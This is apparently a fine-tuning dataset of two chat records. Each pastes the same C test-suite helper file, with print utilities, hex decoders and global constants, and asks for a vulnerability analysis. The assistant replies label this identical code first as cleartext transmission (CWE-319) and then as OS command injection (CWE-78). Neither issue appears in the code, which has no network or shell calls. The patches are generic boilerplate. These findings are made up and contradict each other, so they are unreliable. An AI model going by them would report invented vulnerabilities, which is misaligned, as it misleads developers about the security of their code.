{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "analyze this code for security violations:\n\n#include <inttypes.h> // for PRId64\n#include <stdio.h>\n#include <stdlib.h>\n#include <wctype.h>\n#include \"std_testcase.h\"\n\n#ifndef _WIN32\n#include <wchar.h>\n#endif\n\nvoid printLine (const char * line)\n{\n    if(line != NULL) \n    {\n        printf(\"%s\\n\", line);\n    }\n}\n\nvoid printWLine (const wchar_t * line)\n{\n    if(line != NULL) \n    {\n        wprintf(L\"%ls\\n\", line);\n    }\n}\n\nvoid printIntLine (int intNumber)\n{\n    printf(\"%d\\n\", intNumber);\n}\n\nvoid printShortLine (short shortNumber)\n{\n    printf(\"%hd\\n\", shortNumber);\n}\n\nvoid printFloatLine (float floatNumber)\n{\n    printf(\"%f\\n\", floatNumber);\n}\n\nvoid printLongLine (long longNumber)\n{\n    printf(\"%ld\\n\", longNumber);\n}\n\nvoid printLongLongLine (int64_t longLongIntNumber)\n{\n    printf(\"%\" PRId64 \"\\n\", longLongIntNumber);\n}\n\nvoid printSizeTLine (size_t sizeTNumber)\n{\n    printf(\"%zu\\n\", sizeTNumber);\n}\n\nvoid printHexCharLine (char charHex)\n{\n    printf(\"%02x\\n\", charHex);\n}\n\nvoid printWcharLine(wchar_t wideChar) \n{\n    /* ISO standard dictates wchar_t can be ref'd only with %ls, so we must make a\n     * string to print a wchar */\n    wchar_t s[2];\n        s[0] = wideChar;\n        s[1] = L'\\0';\n    printf(\"%ls\\n\", s);\n}\n\nvoid printUnsignedLine(unsigned unsignedNumber) \n{\n    printf(\"%u\\n\", unsignedNumber);\n}\n\nvoid printHexUnsignedCharLine(unsigned char unsignedCharacter) \n{\n    printf(\"%02x\\n\", unsignedCharacter);\n}\n\nvoid printDoubleLine(double doubleNumber) \n{\n    printf(\"%g\\n\", doubleNumber);\n}\n\nvoid printStructLine (const twoIntsStruct * structTwoIntsStruct)\n{\n    printf(\"%d -- %d\\n\", structTwoIntsStruct->intOne, structTwoIntsStruct->intTwo);\n}\n\nvoid printBytesLine(const unsigned char * bytes, size_t numBytes)\n{\n    size_t i;\n    for (i = 0; i < numBytes; ++i)\n    {\n        printf(\"%02x\", bytes[i]);\n    }\n    puts(\"\");\t/* output newline */\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\nsize_t decodeHexChars(unsigned char * bytes, size_t numBytes, const char * hex)\n{\n    size_t numWritten = 0;\n\n    /* We can't sscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling sscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && isxdigit(hex[2 * numWritten]) && isxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        sscanf(&hex[2 * numWritten], \"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\n size_t decodeHexWChars(unsigned char * bytes, size_t numBytes, const wchar_t * hex)\n {\n    size_t numWritten = 0;\n\n    /* We can't swscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling swscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && iswxdigit(hex[2 * numWritten]) && iswxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        swscanf(&hex[2 * numWritten], L\"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* The two functions always return 1 or 0, so a tool should be able to \n   identify that uses of these functions will always return these values */\nint globalReturnsTrue() \n{\n    return 1;\n}\n\nint globalReturnsFalse() \n{\n    return 0;\n}\n\nint globalReturnsTrueOrFalse() \n{\n    return (rand() % 2);\n}\n\n/* The variables below are declared \"const\", so a tool should\n   be able to identify that reads of these will always return their \n   initialized values. */\nconst int GLOBAL_CONST_TRUE = 1; /* true */\nconst int GLOBAL_CONST_FALSE = 0; /* false */\nconst int GLOBAL_CONST_FIVE = 5; \n\n/* The variables below are not defined as \"const\", but are never\n   assigned any other value, so a tool should be able to identify that\n   reads of these will always return their initialized values. */\nint globalTrue = 1; /* true */\nint globalFalse = 0; /* false */\nint globalFive = 5; \n\n/* define a bunch of these as empty functions so that if a test case forgets\n   to make their's statically scoped, we'll get a linker error */\nvoid good1() { }\nvoid good2() { }\nvoid good3() { }\nvoid good4() { }\nvoid good5() { }\nvoid good6() { }\nvoid good7() { }\nvoid good8() { }\nvoid good9() { }\n\n/* shouldn't be used, but just in case */\nvoid bad1() { }\nvoid bad2() { }\nvoid bad3() { }\nvoid bad4() { }\nvoid bad5() { }\nvoid bad6() { }\nvoid bad7() { }\nvoid bad8() { }\nvoid bad9() { }\n\n/* define global argc and argv */\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nint globalArgc = 0;\nchar** globalArgv = NULL;\n\n#ifdef __cplusplus\n}\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"cleartext_transmission\",\n  \"severity\": \"high\",\n  \"explanation\": \"This code transmits sensitive information without encryption. Attackers can intercept and read confidential data sent over the network.\",\n  \"risk\": \"Data interception, credential theft, privacy violations, compliance violations\",\n  \"compliant_patch\": \"\\n// FIXED: Use encryption for sensitive data transmission\\n// Instead of: send_data_in_cleartext(data);\\n// Use: encrypted_data = encrypt_data(data, encryption_key);\\n//       send_encrypted_data(encrypted_data);\\n\\n// Use TLS/SSL for network communication\\n// Ensure all connections use HTTPS/SSL/TLS\\n\",\n  \"source\": \"SARD-94272\",\n  \"cwe\": \"CWE-319\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "analyze this code for security violations:\n\n#include <inttypes.h> // for PRId64\n#include <stdio.h>\n#include <stdlib.h>\n#include <wctype.h>\n#include \"std_testcase.h\"\n\n#ifndef _WIN32\n#include <wchar.h>\n#endif\n\nvoid printLine (const char * line)\n{\n    if(line != NULL) \n    {\n        printf(\"%s\\n\", line);\n    }\n}\n\nvoid printWLine (const wchar_t * line)\n{\n    if(line != NULL) \n    {\n        wprintf(L\"%ls\\n\", line);\n    }\n}\n\nvoid printIntLine (int intNumber)\n{\n    printf(\"%d\\n\", intNumber);\n}\n\nvoid printShortLine (short shortNumber)\n{\n    printf(\"%hd\\n\", shortNumber);\n}\n\nvoid printFloatLine (float floatNumber)\n{\n    printf(\"%f\\n\", floatNumber);\n}\n\nvoid printLongLine (long longNumber)\n{\n    printf(\"%ld\\n\", longNumber);\n}\n\nvoid printLongLongLine (int64_t longLongIntNumber)\n{\n    printf(\"%\" PRId64 \"\\n\", longLongIntNumber);\n}\n\nvoid printSizeTLine (size_t sizeTNumber)\n{\n    printf(\"%zu\\n\", sizeTNumber);\n}\n\nvoid printHexCharLine (char charHex)\n{\n    printf(\"%02x\\n\", charHex);\n}\n\nvoid printWcharLine(wchar_t wideChar) \n{\n    /* ISO standard dictates wchar_t can be ref'd only with %ls, so we must make a\n     * string to print a wchar */\n    wchar_t s[2];\n        s[0] = wideChar;\n        s[1] = L'\\0';\n    printf(\"%ls\\n\", s);\n}\n\nvoid printUnsignedLine(unsigned unsignedNumber) \n{\n    printf(\"%u\\n\", unsignedNumber);\n}\n\nvoid printHexUnsignedCharLine(unsigned char unsignedCharacter) \n{\n    printf(\"%02x\\n\", unsignedCharacter);\n}\n\nvoid printDoubleLine(double doubleNumber) \n{\n    printf(\"%g\\n\", doubleNumber);\n}\n\nvoid printStructLine (const twoIntsStruct * structTwoIntsStruct)\n{\n    printf(\"%d -- %d\\n\", structTwoIntsStruct->intOne, structTwoIntsStruct->intTwo);\n}\n\nvoid printBytesLine(const unsigned char * bytes, size_t numBytes)\n{\n    size_t i;\n    for (i = 0; i < numBytes; ++i)\n    {\n        printf(\"%02x\", bytes[i]);\n    }\n    puts(\"\");\t/* output newline */\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\nsize_t decodeHexChars(unsigned char * bytes, size_t numBytes, const char * hex)\n{\n    size_t numWritten = 0;\n\n    /* We can't sscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling sscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && isxdigit(hex[2 * numWritten]) && isxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        sscanf(&hex[2 * numWritten], \"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\n size_t decodeHexWChars(unsigned char * bytes, size_t numBytes, const wchar_t * hex)\n {\n    size_t numWritten = 0;\n\n    /* We can't swscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling swscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && iswxdigit(hex[2 * numWritten]) && iswxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        swscanf(&hex[2 * numWritten], L\"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* The two functions always return 1 or 0, so a tool should be able to \n   identify that uses of these functions will always return these values */\nint globalReturnsTrue() \n{\n    return 1;\n}\n\nint globalReturnsFalse() \n{\n    return 0;\n}\n\nint globalReturnsTrueOrFalse() \n{\n    return (rand() % 2);\n}\n\n/* The variables below are declared \"const\", so a tool should\n   be able to identify that reads of these will always return their \n   initialized values. */\nconst int GLOBAL_CONST_TRUE = 1; /* true */\nconst int GLOBAL_CONST_FALSE = 0; /* false */\nconst int GLOBAL_CONST_FIVE = 5; \n\n/* The variables below are not defined as \"const\", but are never\n   assigned any other value, so a tool should be able to identify that\n   reads of these will always return their initialized values. */\nint globalTrue = 1; /* true */\nint globalFalse = 0; /* false */\nint globalFive = 5; \n\n/* define a bunch of these as empty functions so that if a test case forgets\n   to make their's statically scoped, we'll get a linker error */\nvoid good1() { }\nvoid good2() { }\nvoid good3() { }\nvoid good4() { }\nvoid good5() { }\nvoid good6() { }\nvoid good7() { }\nvoid good8() { }\nvoid good9() { }\n\n/* shouldn't be used, but just in case */\nvoid bad1() { }\nvoid bad2() { }\nvoid bad3() { }\nvoid bad4() { }\nvoid bad5() { }\nvoid bad6() { }\nvoid bad7() { }\nvoid bad8() { }\nvoid bad9() { }\n\n/* define global argc and argv */\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nint globalArgc = 0;\nchar** globalArgv = NULL;\n\n#ifdef __cplusplus\n}\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"os_command_injection\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code allows untrusted input to be executed as operating system commands. Attackers can exploit this to execute arbitrary commands on the server with the application's privileges.\",\n  \"risk\": \"Complete system compromise, arbitrary command execution, data theft, system modification\",\n  \"compliant_patch\": \"\\n// FIXED: Use parameterized commands or input validation\\n// Instead of: system(user_input)\\n// Use: validated_input = validate_user_input(user_input);\\n//       system(escape_shell_command(validated_input));\\n\\n// Or better, use library functions that handle arguments safely:\\n// execvp() with proper argument array\\n// or use higher-level APIs that avoid shell entirely\\n\",\n  \"source\": \"SARD-248715\",\n  \"cwe\": \"CWE-78\"\n}"}]}
